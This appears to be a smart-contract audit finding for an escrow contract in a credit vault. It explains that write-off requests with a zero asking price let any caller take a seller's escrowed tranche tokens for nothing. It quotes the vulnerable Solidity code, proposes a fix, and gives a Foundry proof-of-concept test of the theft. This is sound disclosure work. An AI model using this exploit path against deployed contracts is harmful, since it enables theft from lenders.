### Title
Zero-price write-off requests allow any fulfiller to steal escrowed tranche tokens - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that the seller escrows a nonzero tranche amount but accepts `underlyingsRequested == 0`. Because `fullfillWriteOffRequest` is callable by any wallet and only requires `_underlyings >= currentRequest.underlyings`, an attacker can pass `_underlyings = 0` and receive the seller's entire escrowed tranche position without transferring any underlying asset. [1](#0-0) [2](#0-1) 

### Finding Description
The escrow is intended to exchange a lender's tranche tokens for the underlying amount requested by that lender. During a running epoch, `createWriteOffRequest` transfers `amount` tranche tokens into escrow and records the requested underlying amount, but it rejects only `amount == 0`. [3](#0-2) 

Fulfillment does not impose a positive-price invariant. If the recorded request has `underlyings == 0`, the check `_underlyings < currentRequest.underlyings` succeeds with `_underlyings == 0`. The function then performs zero-value underlying transfers and still sends the exact escrowed `_tranches` amount to `msg.sender`. [2](#0-1) 

This is the vault analogue of accepting a malformed scheme/input before enforcing the protocol invariant: a sell request can enter a state where the required consideration is zero even though the deposited asset is nonzero.

### Impact Explanation
An unprivileged fulfiller can take the full escrowed tranche amount at zero cost. For example, a lender who creates a request for `10,000` AA tranche tokens but accidentally supplies `underlyingsRequested = 0` loses all `10,000` tranche tokens and receives `0` underlying, while the attacker receives the full tranche balance. [2](#0-1) 

The stolen tranche tokens retain their claim on vault value and may later be redeemed through the normal withdrawal path by an eligible holder, or sold to the borrower or another buyer. The direct loss is approximately `amount * tranchePrice(tranche) / 1e18` underlying units, plus applicable accrued value; at the initialization price of `1`, a `10,000e18` tranche theft represents approximately `10,000` underlying units. [4](#0-3) [5](#0-4) 

### Likelihood Explanation
The attack requires a lender to submit or aggregate a request whose stored `underlyings` amount is zero. That is a plausible transaction-construction or integration error because the function already validates the adjacent `amount == 0` case but provides no comparable protection for a zero asking price. [1](#0-0) 

Once such a request exists, exploitation is unconditional: any EOA or contract can call `fullfillWriteOffRequest`, no KYC, borrower status, manager action, liquidity, or privileged role is required. The attacker can monitor the public mapping/events and complete the theft in the next transaction. [6](#0-5) 

### Recommendation
Reject zero-price requests at creation:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Also reject `_underlyings == 0` in `fullfillWriteOffRequest` as defense in depth for requests created before the fix. If zero-value gifts are intentionally supported, they should be handled through a separate, explicit flow rather than by the debt-purchase escrow path.

### Proof of Concept
Add this regression test to the existing mainnet-fork suite in `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which already initializes `escrow`, `LP`, `tranche`, and `underlying` against a live credit-vault deployment. [7](#0-6) 

```solidity
function testZeroPriceWriteOffRequestCanBeStolen() external {
    address attacker = makeAddr("zero-price-buyer");
    uint256 escrowedTranches = 10_000e18;

    uint256 sellerTranchePre = tranche.balanceOf(LP);
    uint256 sellerUnderlyingPre = underlying.balanceOf(LP);
    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);

    // The seller escrows tranche tokens but accidentally requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(escrowedTranches, 0);

    // Any unprivileged account can fulfill the zero-price request.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, escrowedTranches, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0, "request was not consumed");
    assertEq(underlyings, 0, "request underlying was not cleared");

    assertEq(
        sellerTranchePre - tranche.balanceOf(LP),
        escrowedTranches,
        "seller lost escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP),
        sellerUnderlyingPre,
        "seller received no underlying"
    );
    assertEq(
        tranche.balanceOf(attacker) - attackerTranchePre,
        escrowedTranches,
        "attacker did not receive escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(attacker),
        attackerUnderlyingPre,
        "attacker paid underlying"
    );
}
```

```text
  /// @notice create a write-off request by depositing tranche tokens and setting the amount of underlyings requested
  /// @param amount of tranche tokens to deposit
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
